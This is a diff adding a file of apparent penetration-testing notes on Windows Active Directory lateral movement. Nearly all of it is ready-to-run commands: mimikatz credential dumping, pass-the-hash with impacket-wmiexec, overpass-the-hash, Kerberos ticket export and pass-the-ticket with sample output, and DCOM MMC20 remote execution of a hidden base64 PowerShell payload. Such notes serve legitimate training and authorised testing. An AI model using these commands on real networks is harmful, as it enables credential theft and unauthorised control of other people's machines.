@@ -1,0 +1,41 @@
+#PassTheHash
+/usr/bin/impacket-wmiexec -hashes :<hash> Administrator@<ip>
+#OverpassTheHash
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+#get NTLM
+mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:<hash> /run:powershell
+#after convert NTLM in Kerberos TGT you can use any tools that rely kerberos authentication
+net use \\<host>
+klist
+#so you can use also psexec
+.\PsExec.exe \\<host> cmd
+#PassTheTicket
+#export save to disk in kirbi mimikatz format
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
+dir *.kirbi
+
+Directory: C:\Tools
+Mode LastWriteTime Length Name
+---- ------------- ------ ----
+-a---- 9/14/2022 6:24 AM 1561 [0;12bd0]-0-0-40810000-dave@cifsweb04.kirbi
+-a---- 9/14/2022 6:24 AM 1505 [0;12bd0]-2-0-40c10000-dave@krbtgtCORP.COM.kirbi
+-a---- 9/14/2022 6:24 AM 1561 [0;1c6860]-0-0-40810000-dave@cifsweb04.kirbi
+-a---- 9/14/2022 6:24 AM 1505 [0;1c6860]-2-0-40c10000-dave@krbtgtCORP.COM.kirbi
+-a---- 9/14/2022 6:24 AM 1561 [0;1c7bcc]-0-0-40810000-dave@cifs
+
+#use ticket of dave@cifs...
+mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifsweb04.kirbi
+klist
+
+#DCOM Distributed Component Object Model is a distributed remote version of COM
+#Local administrator access is required to call the DCOM Service Control Manager
+#configure
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<IP>"))
+#execute remote command
+$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
+#execute base64 powershell payloads
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w 
+hidden -e <payload>","7")
+
